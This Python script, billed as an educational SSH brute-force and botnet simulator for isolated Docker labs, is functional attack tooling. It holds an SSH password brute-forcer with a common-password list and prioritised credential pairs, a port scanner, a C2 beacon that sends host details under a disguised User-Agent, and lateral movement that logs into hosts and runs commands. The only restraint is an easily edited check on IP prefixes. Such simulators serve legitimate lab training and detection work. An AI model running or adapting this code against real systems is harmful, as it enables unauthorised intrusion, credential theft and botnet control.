#!/usr/bin/env python3
"""
=============================================================================
SSH Brute-Force & Botnet Simulator
=============================================================================
EDUCATIONAL USE ONLY — runs inside isolated Docker lab networks.
"""

import argparse
import socket
import time
import random
import json
import threading
import sys
import os
import logging
from datetime import datetime

try:
    import paramiko
    # Silence paramiko's transport-thread logger — it prints scary-looking
    # "Exception (client): Error reading SSH protocol banner" tracebacks
    # to stderr from inside its own thread, BEFORE our exception handler
    # gets to retry. They are noise, not failures.
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL)
except ImportError:
    paramiko = None


SAFETY_BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  BOTNET SIMULATOR — EDUCATIONAL USE ONLY                    ║
║  All traffic is contained within isolated Docker networks.  ║
╚══════════════════════════════════════════════════════════════╝
"""

ALLOWED_NETWORKS = [
    "172.21.0.", "10.10.0.", "10.20.0.", "192.168.100."
]

SSH_USERNAMES = ["labuser", "admin", "root", "ubuntu", "test", "pi", "user",
                 "deploy", "operator", "svcaccount"]

# Common SSH passwords — the shuffled bulk pool
SSH_PASSWORDS = [
    "password", "password123", "admin", "123456", "letmein",
    "welcome", "monkey", "dragon", "master", "qwerty",
    "test", "lab", "default", "changeme", "pass1234",
    "internal123", "service1", "deepnet123",
    "toor", "deploy123", "operator1", "rootpass", "rootdeep",
]

# Known-good lab credentials tried FIRST so legit lateral movement
# succeeds in ~5-10 attempts instead of bashing through 100+ shuffled tries.
PRIORITY_CREDS = [
    ("labuser",  "password123"),  # victim1, victim2
    ("admin",    "admin"),         # victim1, victim2
    ("labuser",  "internal123"),  # victim3, honeypot
    ("svcaccount","service1"),    # victim3, honeypot
    ("labuser",  "deepnet123"),   # victim4, victim5
    ("operator", "operator1"),    # victim4, victim5
    ("deploy",   "deploy123"),    # victim1, victim2
    ("root",     "toor"),          # victim1, victim2
    ("root",     "rootpass"),     # victim3, honeypot
    ("root",     "rootdeep"),     # victim4, victim5
]

C2_MESSAGE_TYPES = ["REGISTER","HEARTBEAT","STATUS","ACK_COMMAND","EXFIL_READY","IDLE"]
LATERAL_TECHNIQUES = ["ssh_credential_reuse","ssh_key_discovery","known_hosts_pivot",
                      "password_spray","service_discovery"]


def safety_check(target: str) -> bool:
    allowed = any(target.startswith(n) for n in ALLOWED_NETWORKS)
    if not allowed:
        print(f"[SAFETY] Target {target} outside lab networks {ALLOWED_NETWORKS}. Aborting.")
    return allowed


def setup_logging(name: str):
    log = logging.getLogger(name)
    log.setLevel(logging.INFO)
    if not log.handlers:
        h = logging.StreamHandler()
        h.setFormatter(logging.Formatter(
            "%(asctime)s [%(name)s] %(levelname)s %(message)s",
            datefmt="%Y-%m-%dT%H:%M:%S"))
        log.addHandler(h)
    return log


# ─────────────────────────────────────────────────────────────────────────────
class SSHBruteforceSimulator:
    def __init__(self, target, port=22, delay=0.3, wordlist=None):
        self.target = target
        self.port = port
        self.delay = delay
        self.wordlist = wordlist
        self.log = setup_logging("BruteForce")
        self.attempts = 0
        self.success = False
        self.cracked_cred = None

    def load_wordlist(self):
        if not self.wordlist or not os.path.isfile(self.wordlist):
            return SSH_PASSWORDS
        with open(self.wordlist, 'r', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]

    def attempt_login(self, username, password, _retry=0):
        if not paramiko:
            try:
                s = socket.create_connection((self.target, self.port), timeout=3)
                s.close(); return False
            except Exception:
                return False

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.target, port=self.port, username=username,
                           password=password, timeout=15, banner_timeout=100,
                           look_for_keys=False, allow_agent=False)
            self.log.warning(f"[!] CREDENTIAL FOUND: {username}:{password} @ {self.target}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            self.log.info(f"FAILED [{self.attempts:04d}] {username}:{password} @ {self.target}")
            return False
        except paramiko.SSHException as e:
            if _retry < 2:
                time.sleep(2 ** _retry)
                return self.attempt_login(username, password, _retry + 1)
            return False
        except (socket.error, OSError):
            if _retry < 2:
                time.sleep(2 ** _retry)
                return self.attempt_login(username, password, _retry + 1)
            return False
        except Exception as e:
            self.log.debug(f"Unexpected ({type(e).__name__}): {e}")
            return False

    def run(self, max_attempts=150, stop_on_success=True):
        if not safety_check(self.target):
            return

        passwords = self.load_wordlist()
        self.log.info(f"Brute-force → {self.target}:{self.port}")
        self.log.info(f"Trying {len(PRIORITY_CREDS)} known lab creds first, then {len(SSH_USERNAMES)} × {len(passwords)} shuffled")

        # PHASE A: try the known-good lab credentials first
        for u, p in PRIORITY_CREDS:
            self.attempts += 1
            if self.attempt_login(u, p):
                self.success = True
                self.cracked_cred = (u, p)
                if stop_on_success:
                    self.log.info(f"Brute-force complete after {self.attempts} attempts (priority list)")
                    return
            time.sleep(self.delay)

        # PHASE B: shuffled brute-force
        creds = [(u, p) for u in SSH_USERNAMES for p in passwords]
        random.shuffle(creds)
        for u, p in creds[:max_attempts - len(PRIORITY_CREDS)]:
            self.attempts += 1
            if self.attempt_login(u, p):
                self.success = True
                self.cracked_cred = (u, p)
                if stop_on_success:
                    break
            time.sleep(self.delay + random.uniform(0, 0.1))

        self.log.info(f"Brute-force complete: {self.attempts} attempts, success={self.success}, cred={self.cracked_cred}")


# ─────────────────────────────────────────────────────────────────────────────
class PortScanSimulator:
    COMMON_PORTS = [22,23,80,443,3306,5432,6379,8080,8443,9200,27017]

    def __init__(self, network_prefix, delay=0.2):
        self.network_prefix = network_prefix
        self.delay = delay
        self.log = setup_logging("Scanner")

    def probe_port(self, host, port, timeout=1.0):
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            s.close()
            self.log.info(f"OPEN  {host}:{port}")
            return True
        except Exception:
            return False

    def scan_host(self, host):
        self.log.info(f"Scanning host {host}")
        for port in self.COMMON_PORTS:
            self.probe_port(host, port)
            time.sleep(self.delay)

    def run(self, host_range=None):
        if host_range is None:
            host_range = range(1, 30)
        self.log.info(f"Scanning {self.network_prefix}x")
        for i in host_range:
            host = f"{self.network_prefix}{i}"
            if not safety_check(host):
                continue
            self.scan_host(host)
            time.sleep(self.delay * 2)


# ─────────────────────────────────────────────────────────────────────────────
class C2HeartbeatSimulator:
    def __init__(self, c2_host, c2_port=8888, beacon_interval=30, jitter=5):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.beacon_interval = beacon_interval
        self.jitter = jitter
        self.log = setup_logging("C2Beacon")
        self.bot_id = f"bot-{random.randint(1000,9999)}"

    def build_beacon(self):
        return {"bot_id": self.bot_id, "type": random.choice(C2_MESSAGE_TYPES),
                "timestamp": datetime.utcnow().isoformat(),
                "hostname": socket.gethostname(),
                "uptime_sec": random.randint(3600, 864000)}

    def send_beacon(self):
        payload = json.dumps(self.build_beacon()).encode()
        try:
            s = socket.create_connection((self.c2_host, self.c2_port), timeout=5)
            req = (f"POST /beacon HTTP/1.1\r\nHost: {self.c2_host}\r\n"
                   f"Content-Length: {len(payload)}\r\n"
                   f"User-Agent: Mozilla/5.0 (compatible; updater/1.0)\r\n"
                   f"X-Bot-ID: {self.bot_id}\r\n\r\n").encode() + payload
            s.sendall(req); s.recv(1024); s.close()
            self.log.info(f"BEACON → {self.c2_host}:{self.c2_port} [bot={self.bot_id}]")
            return True
        except Exception as e:
            self.log.warning(f"Beacon failed: {e}")
            return False

    def run(self, num_beacons=10):
        if not safety_check(self.c2_host):
            return
        for i in range(num_beacons):
            self.send_beacon()
            time.sleep(max(1, self.beacon_interval + random.uniform(-self.jitter, self.jitter)))


# ─────────────────────────────────────────────────────────────────────────────
class LateralMovementSimulator:
    INTERNAL_TARGETS = ["10.10.0.10","10.10.0.50","10.10.0.1","10.10.0.100","10.20.0.10"]

    def __init__(self, pivot_host, delay=1.0, wordlist=None):
        self.pivot_host = pivot_host
        self.delay = delay
        self.wordlist = wordlist
        self.log = setup_logging("LateralMove")
        self.technique = random.choice(LATERAL_TECHNIQUES)

    def load_wordlist(self):
        if not self.wordlist or not os.path.isfile(self.wordlist):
            return SSH_PASSWORDS
        with open(self.wordlist, 'r', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]

    def attempt_pivot(self, target, username, password, _retry=0):
        if not safety_check(target):
            return False
        self.log.info(f"LATERAL [{self.technique}] {self.pivot_host} → {target} user={username}")

        if not paramiko:
            return False

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target, port=22, username=username, password=password,
                           timeout=15, banner_timeout=100,
                           look_for_keys=False, allow_agent=False)
            self.log.warning(f"[!] LATERAL ACCESS GAINED: {target} user={username}")
            _, out, _ = client.exec_command("hostname && id")
            self.log.warning(f"[!] {out.read().decode().strip()}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException:
            if _retry < 2:
                time.sleep(2 ** _retry)
                return self.attempt_pivot(target, username, password, _retry + 1)
            return False
        except (socket.error, OSError):
            if _retry < 2:
                time.sleep(2 ** _retry)
                return self.attempt_pivot(target, username, password, _retry + 1)
            return False
        except Exception:
            return False

    def run(self, max_attempts=200):
        passwords = self.load_wordlist()
        self.log.info(f"Lateral movement from pivot={self.pivot_host} technique={self.technique}")

        # Try priority creds first against each target
        attempts = 0
        for target in self.INTERNAL_TARGETS:
            for u, p in PRIORITY_CREDS:
                attempts += 1
                if attempts > max_attempts:
                    return
                if self.attempt_pivot(target, u, p):
                    return
                time.sleep(self.delay)

        # Then shuffled
        for target in self.INTERNAL_TARGETS:
            for u in SSH_USERNAMES[:3]:
                for p in passwords[:30]:
                    attempts += 1
                    if attempts > max_attempts:
                        return
                    if self.attempt_pivot(target, u, p):
                        return
                    time.sleep(self.delay)


# ─────────────────────────────────────────────────────────────────────────────
class InfectedHostSimulator:
    def __init__(self, c2_host, target_network):
        self.c2_host = c2_host
        self.target_network = target_network
        self.log = setup_logging("InfectedHost")
        self.bot_id = f"bot-{socket.gethostname()}-{os.getpid()}"

    def report_status(self):
        s = {"event":"STATUS_REPORT","bot_id":self.bot_id,
             "hostname":socket.gethostname(),
             "timestamp":datetime.utcnow().isoformat()}
        self.log.info(f"STATUS: {json.dumps(s)}")

    def run(self, duration_seconds=120):
        if not safety_check(self.c2_host):
            return
        start = time.time(); cycle = 0
        while (time.time() - start) < duration_seconds:
            cycle += 1
            self.report_status()
            if cycle % 5 == 0:
                C2HeartbeatSimulator(self.c2_host, beacon_interval=0, jitter=0).send_beacon()
            time.sleep(10)


# ─────────────────────────────────────────────────────────────────────────────
def main():
    print(SAFETY_BANNER)
    p = argparse.ArgumentParser(description="SSH/Botnet Simulator — Educational Use Only")
    sub = p.add_subparsers(dest="mode")

    bf = sub.add_parser("bruteforce")
    bf.add_argument("--target", default="172.21.0.20")
    bf.add_argument("--port", type=int, default=22)
    bf.add_argument("--delay", type=float, default=0.3)
    bf.add_argument("--max-attempts", type=int, default=150)
    bf.add_argument("--wordlist")

    sc = sub.add_parser("scan")
    sc.add_argument("--network", default="172.21.0.")
    sc.add_argument("--delay", type=float, default=0.2)

    c2 = sub.add_parser("c2")
    c2.add_argument("--c2-host", default="172.21.0.10")
    c2.add_argument("--port", type=int, default=8888)
    c2.add_argument("--interval", type=int, default=10)
    c2.add_argument("--count", type=int, default=10)

    lat = sub.add_parser("lateral")
    lat.add_argument("--pivot", default="172.21.0.20")
    lat.add_argument("--delay", type=float, default=0.5)
    lat.add_argument("--max-attempts", type=int, default=200)
    lat.add_argument("--wordlist")

    inf = sub.add_parser("infected")
    inf.add_argument("--c2-host", default="172.21.0.10")
    inf.add_argument("--target-net", default="172.21.0.")
    inf.add_argument("--duration", type=int, default=120)

    bot = sub.add_parser("botnet")
    bot.add_argument("--target", default="172.21.0.20")
    bot.add_argument("--c2-host", default="172.21.0.10")

    args = p.parse_args()
    if not args.mode:
        p.print_help(); sys.exit(0)

    if args.mode == "bruteforce":
        SSHBruteforceSimulator(args.target, args.port, args.delay, args.wordlist).run(args.max_attempts)
    elif args.mode == "scan":
        PortScanSimulator(args.network, args.delay).run()
    elif args.mode == "c2":
        C2HeartbeatSimulator(args.c2_host, args.port, args.interval).run(args.count)
    elif args.mode == "lateral":
        LateralMovementSimulator(args.pivot, args.delay, args.wordlist).run(args.max_attempts)
    elif args.mode == "infected":
        InfectedHostSimulator(args.c2_host, args.target_net).run(args.duration)
    elif args.mode == "botnet":
        PortScanSimulator("172.21.0.").run(range(1,25))
        SSHBruteforceSimulator(args.target).run(150)
        LateralMovementSimulator(args.target).run(200)
        C2HeartbeatSimulator(args.c2_host, beacon_interval=5).run(6)


if __name__ == "__main__":
    main()
